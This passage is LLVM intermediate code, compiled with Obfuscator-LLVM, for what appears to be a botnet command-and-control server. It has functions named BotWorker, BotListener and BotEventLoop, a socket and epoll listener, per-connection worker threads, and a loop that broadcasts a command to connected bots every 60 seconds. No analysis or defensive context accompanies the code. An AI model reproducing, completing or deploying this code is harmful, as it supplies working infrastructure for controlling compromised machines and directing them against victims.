  %18 = call i32 @bind(i32 %6, %struct.sockaddr* nonnull %17, i32 16) #10
  %19 = icmp slt i32 %18, 0
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %9
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.79, i64 0, i64 0)) #12
  br label %21

; <label>:21:                                     ; preds = %20, %9
  %22 = call i32 @listen(i32 %6, i32 5) #10
  store i32 16, i32* %2, align 4
  %23 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  br label %24

; <label>:24:                                     ; preds = %28, %21
  %25 = call i32 @accept(i32 %6, %struct.sockaddr* nonnull %23, i32* nonnull %2) #10
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %24
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.80, i64 0, i64 0)) #12
  br label %28

; <label>:28:                                     ; preds = %27, %24
  %29 = sext i32 %25 to i64
  %30 = inttoptr i64 %29 to i8*
  %31 = call i32 @pthread_create(i64* nonnull %5, %union.pthread_attr_t* null, i8* (i8*)* nonnull @BotWorker, i8* %30) #10
  br label %24
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #6

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) local_unnamed_addr #3

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture readonly, i8** nocapture readnone) local_unnamed_addr #5 {
  %4 = alloca %struct.epoll_event, align 4
  %5 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #10
  %6 = icmp eq i32 %0, 4
  br i1 %6, label %11, label %7

; <label>:7:                                      ; preds = %3
  %8 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %9 = load i8*, i8** %1, align 8
  %10 = tail call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %8, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.81, i64 0, i64 0), i8* %9) #12
  tail call void @exit(i32 1) #13
  unreachable

; <label>:11:                                     ; preds = %3
  %12 = getelementptr inbounds i8*, i8** %1, i64 3
  %13 = load i8*, i8** %12, align 8
  %14 = tail call i32 @atoi(i8* %13) #9
  %15 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.83, i64 0, i64 0))
  store %struct._IO_FILE* %15, %struct._IO_FILE** @telFD, align 8
  %16 = getelementptr inbounds i8*, i8** %1, i64 2
  %17 = load i8*, i8** %16, align 8
  %18 = tail call i32 @atoi(i8* %17) #9
  %19 = getelementptr inbounds i8*, i8** %1, i64 1
  %20 = load i8*, i8** %19, align 8
  %21 = tail call fastcc i32 @create_and_bind(i8* %20)
  store volatile i32 %21, i32* @listenFD, align 4
  %22 = load volatile i32, i32* @listenFD, align 4
  %23 = icmp eq i32 %22, -1
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %11
  tail call void @abort() #13
  unreachable

; <label>:25:                                     ; preds = %11
  %26 = load volatile i32, i32* @listenFD, align 4
  %27 = tail call fastcc i32 @make_socket_non_blocking(i32 %26)
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %25
  tail call void @abort() #13
  unreachable

; <label>:30:                                     ; preds = %25
  %31 = load volatile i32, i32* @listenFD, align 4
  %32 = tail call i32 @listen(i32 %31, i32 128) #10
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %34, label %35

; <label>:34:                                     ; preds = %30
  tail call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i64 0, i64 0)) #12
  tail call void @abort() #13
  unreachable

; <label>:35:                                     ; preds = %30
  %36 = tail call i32 @epoll_create1(i32 0) #10
  store volatile i32 %36, i32* @epollFD, align 4
  %37 = load volatile i32, i32* @epollFD, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

; <label>:39:                                     ; preds = %35
  tail call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.85, i64 0, i64 0)) #12
  tail call void @abort() #13
  unreachable

; <label>:40:                                     ; preds = %35
  %41 = load volatile i32, i32* @listenFD, align 4
  %42 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i64 0, i32 1
  %43 = bitcast %union.epoll_data* %42 to i32*
  store i32 %41, i32* %43, align 4
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %4, i64 0, i32 0
  store i32 -2147483647, i32* %44, align 4
  %45 = load volatile i32, i32* @epollFD, align 4
  %46 = load volatile i32, i32* @listenFD, align 4
  %47 = call i32 @epoll_ctl(i32 %45, i32 1, i32 %46, %struct.epoll_event* nonnull %4) #10
  %48 = icmp eq i32 %47, -1
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %40
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0)) #12
  call void @abort() #13
  unreachable

; <label>:50:                                     ; preds = %40
  %51 = add nsw i32 %18, 2
  %52 = zext i32 %51 to i64
  %53 = alloca i64, i64 %52, align 16
  %54 = icmp eq i32 %18, 0
  br i1 %54, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %50
  %55 = sext i32 %18 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %55, %.lr.ph.preheader ], [ %indvars.iv.next, %.lr.ph ]
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %56 = getelementptr inbounds i64, i64* %53, i64 %indvars.iv
  %57 = call i32 @pthread_create(i64* %56, %union.pthread_attr_t* null, i8* (i8*)* nonnull @BotEventLoop, i8* null) #10
  %58 = trunc i64 %indvars.iv.next to i32
  %59 = icmp eq i32 %58, 0
  br i1 %59, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %50
  %60 = sext i32 %14 to i64
  %61 = inttoptr i64 %60 to i8*
  %62 = call i32 @pthread_create(i64* nonnull %53, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %61) #10
  br label %63

; <label>:63:                                     ; preds = %63, %._crit_edge
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i64 0, i64 0))
  %64 = call i32 @sleep(i32 60) #10
  br label %63
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) local_unnamed_addr #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #8

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @create_and_bind(i8*) unnamed_addr #0 {
  %2 = alloca %struct.addrinfo, align 8
  %3 = alloca %struct.addrinfo*, align 8
  %4 = alloca i32, align 4
  %5 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %2, i64 0, i32 2
  %6 = bitcast %struct.addrinfo* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %6, i8 0, i64 48, i32 8, i1 false)
  store i32 1, i32* %5, align 8
  %7 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %2, i64 0, i32 0
  store i32 1, i32* %7, align 8
  %8 = call i32 @getaddrinfo(i8* null, i8* %0, %struct.addrinfo* nonnull %2, %struct.addrinfo** nonnull %3) #10
  %9 = icmp eq i32 %8, 0
  br i1 %9, label %.preheader, label %12

.preheader:                                       ; preds = %1
  %.01719 = load %struct.addrinfo*, %struct.addrinfo** %3, align 8
  %10 = icmp eq %struct.addrinfo* %.01719, null
  br i1 %10, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %11 = bitcast i32* %4 to i8*
  br label %16

; <label>:12:                                     ; preds = %1
  %13 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %14 = call i8* @gai_strerror(i32 %8) #10
  %15 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %13, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.88, i64 0, i64 0), i8* %14) #12
  br label %45

; <label>:16:                                     ; preds = %.lr.ph, %38
  %.01720 = phi %struct.addrinfo* [ %.01719, %.lr.ph ], [ %.017, %38 ]
  %17 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 1
  %18 = load i32, i32* %17, align 4
  %19 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 2
  %20 = load i32, i32* %19, align 8
  %21 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 3
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @socket(i32 %18, i32 %20, i32 %22) #10
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %38, label %25

; <label>:25:                                     ; preds = %16
  store i32 1, i32* %4, align 4
  %26 = call i32 @setsockopt(i32 %23, i32 1, i32 2, i8* nonnull %11, i32 4) #10
  %27 = icmp eq i32 %26, -1
  br i1 %27, label %28, label %29

; <label>:28:                                     ; preds = %25
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i64 0, i64 0)) #12
  br label %29

; <label>:29:                                     ; preds = %28, %25
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 5
  %31 = load %struct.sockaddr*, %struct.sockaddr** %30, align 8
  %32 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 4
  %33 = load i32, i32* %32, align 8
  %34 = call i32 @bind(i32 %23, %struct.sockaddr* %31, i32 %33) #10
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %43, label %36

; <label>:36:                                     ; preds = %29
  %37 = call i32 @close(i32 %23) #10
  br label %38

; <label>:38:                                     ; preds = %16, %36
  %39 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %.01720, i64 0, i32 7
  %.017 = load %struct.addrinfo*, %struct.addrinfo** %39, align 8
  %40 = icmp eq %struct.addrinfo* %.017, null
  br i1 %40, label %._crit_edge.loopexit, label %16

._crit_edge.loopexit:                             ; preds = %38
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %41 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %42 = call i64 @fwrite(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.90, i64 0, i64 0), i64 15, i64 1, %struct._IO_FILE* %41) #12
  br label %45

; <label>:43:                                     ; preds = %29
  %44 = load %struct.addrinfo*, %struct.addrinfo** %3, align 8
  call void @freeaddrinfo(%struct.addrinfo* %44) #10
  br label %45

; <label>:45:                                     ; preds = %43, %._crit_edge, %12
  %.018 = phi i32 [ -1, %12 ], [ -1, %._crit_edge ], [ %23, %43 ]
  ret i32 %.018
}

; Function Attrs: noreturn nounwind
declare void @abort() local_unnamed_addr #8

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) local_unnamed_addr #3

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) local_unnamed_addr #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) local_unnamed_addr #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #9

; Function Attrs: nounwind readonly
declare i32 @strncmp(i8* nocapture, i8* nocapture, i64) #9

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: nounwind
declare i64 @fwrite(i8* nocapture, i64, i64, %struct._IO_FILE* nocapture) #10

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { noinline noreturn nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind }
attributes #11 = { nounwind readnone }
attributes #12 = { cold }
attributes #13 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
